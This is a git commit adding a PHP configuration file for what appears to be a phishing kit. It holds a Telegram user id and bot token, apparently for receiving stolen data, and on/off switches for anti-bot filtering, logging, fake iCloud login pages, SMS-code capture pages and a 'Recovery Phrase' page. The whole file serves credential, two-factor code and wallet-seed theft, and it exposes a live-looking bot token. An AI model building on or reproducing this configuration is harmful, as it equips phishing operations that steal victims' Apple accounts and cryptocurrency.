91aad520c2441736ee00d17107e661f023a55925
alidopelines <alidopelines@gmail.com>
2024-10-19 03:46:03 +0200

    Add files via upload

---
+++ home/inc/main.php
@@ -0,0 +1,36 @@
+<?php 
+session_start();
+error_reporting(0);
+
+/* Your Infos */
+$email="";
+$userid='6217438190';
+$token="6251891306:AAFH9SMDT6gbbvX3CBR3rkZZ9vg8qj0c_H4";
+
+// Time 2 wait (process)
+$t1w=1; //process 1
+$t2w=60; //process 2
+/* Enable/Disable Pages  
+true : ON  
+false: OFF
+*/
+// Antibots
+$ants=true;
+// log 
+$logs=true;
+// SMS1
+$sms1=true;
+// iCloud page 1
+$icloud1=true;
+// iCloud page 2
+$icloud2=true;
+// iCloud SMS page 1
+$iclouds1=true;
+// iCloud SMS page 2
+$iclouds2=true;
+// SMS 2 
+$sms2=true;
+// Recovery Phrase
+$rphr=true;
+
+?>
